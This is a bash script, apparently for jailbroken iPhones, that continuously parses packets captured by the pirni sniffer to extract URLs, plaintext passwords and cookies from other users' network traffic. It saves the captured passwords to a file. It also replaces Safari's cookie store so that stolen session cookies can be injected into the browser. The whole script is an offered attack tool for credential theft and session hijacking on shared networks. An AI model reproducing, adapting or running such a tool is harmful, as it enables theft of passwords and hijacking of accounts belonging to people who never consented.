#!/bin/bash

###################################
# derv's network dump-file scanner#
###################################
# 
# pirni is a packet sniffer, 
# this script filters the packets
# 
# This script:
#   -filters the packets
#   -outputs results to screen
#   -auto-saves to a file
# 
# arguments: [optional]
#     -u : print out urls
#     -p : print out plaintext passwords
#     -c : reads specific cookies, injects into safari
# 
# USAGE:
#    ./derv.sh
#    # this receives just passwords by default 
#    
#    ./derv.sh 10.4.5.8 -p
#    # displays passwords only, not urls or cookies
#    
#    ./derv.sh -u -p
#    # only sniffs for urls and passwords
#    
###################################

# set up trap for when ctrl+c is pressed
trap itsatarp INT

# function runs when user presses ctrl+c
function itsatarp() {
  echo 
  echo "This script has ended."
  echo "Don't forget to stop pirni as well!"
  
  # remove temporary file
  rm $tmp
  
  exit 0
}

# root check
if [ "$UID" != 0 ]; then
  echo "You must be logged in as root to use this script."
  echo "Type 'su' to log in as root."
  exit
fi

# if they choose the option to restore cookies...
if [[ $1 == restore ]]; then
  # location of cookies & backup
  cookstring="/private/var/mobile/Library/Cookies/Cookies"
  
  # if there is a backup
  if [ -f ${cookstring}"_backup" ]; then
    # remove any existing cookies
    if [ -f ${cookstring}".plist" ]; then
      rm -f ${cookstring}".plist"
      wait
    fi
    
    # put the backup files back in place.
    mv ${cookstring}"_backup" ${cookstring}".plist"
    
    echo Backed up cookies restored!
  else
    echo There was no backup file found.  Unable to restore cookies.
  fi
  
  exit 0
fi

# clear

# set file variables
file="log.pcap" # file pirni outputs packets to
tmp="temp"      # temporary control file for other scripts to use

# boolean flags for options
burl=false    # shows urls
bpw=false     # shows plaintext passwords
bcook=false   # shows cookies

runonce=false # if true: only run once, do not delete pcap file

# loop through every argument
for i in $*
do
  if [ $i == '-u' ]; then
    burl=true
  elif [ $i == '-p' ]; then
    bpw=true
  elif [ $i == '-c' ]; then
    bcook=true
  elif [ $i == '-d' ]; then
    runonce=true
  fi
done

# set the default if no options are selected
if [ $burl == false ] && [ $bpw == false ] && [ $bcook == false ]; then
  bpw=true
fi

# if we're dealing with cookies
if [ $bcook == true ]; then
  
  # if there isn't already a cookies backup file...
  if [ ! -f "/private/var/mobile/Library/Cookies/Cookies_backup" ]; then
    
    # move the cookies to a backup file
    mv /private/var/mobile/Library/Cookies/Cookies.plist /private/var/mobile/Library/Cookies/Cookies_backup
    
    wait
  fi
  
  # delete the current cookies
  rm -rf /private/var/mobile/Library/Cookies/Cookies.plist
  
  # loop until the cookies are gone
  while [ -f /private/var/mobile/Library/Cookies/Cookies.plist ]; do
    wait
  done
fi


echo "Data for URLs, passwords, and/or cookies"
echo "   will appear as they are received."
echo "All passwords saved to 'pw.txt'"

if [ $bcook == true ]; then
  echo Cookies have been backed up! 
  echo Run: \"derv.sh restore\" to restore backup.
fi

echo "Reading packets from ${file}..."


# infinite loop ; until user presses ctrl+c
while [ 1 ]; do
  # move packets to a temporary file
  cat $file > $tmp
  
  # erase packet dump file, only for continuous parsing
  if [ $runonce == false ]; then
    > $file
  fi
  
  # look for urls
  if [ $burl == true ]; then
    /usr/local/pirni-derv/derv-url.sh
  fi
  
  # look for and display passwords
  if [ $bpw == true ]; then
    /usr/local/pirni-derv/derv-pw.sh
  fi
  
  # look for cookies
  if [ $bcook == true ]; then
    /usr/local/pirni-derv/derv-cookie.sh
  fi
  
  # if we are only running once
  if [ $runonce == true ]; then
    echo 
    echo "Parsing of log.pcap complete."
    
    # remove temp file
    rm $tmp
    
    exit 0
  fi
  
  sleep 5
  
done

exit 0
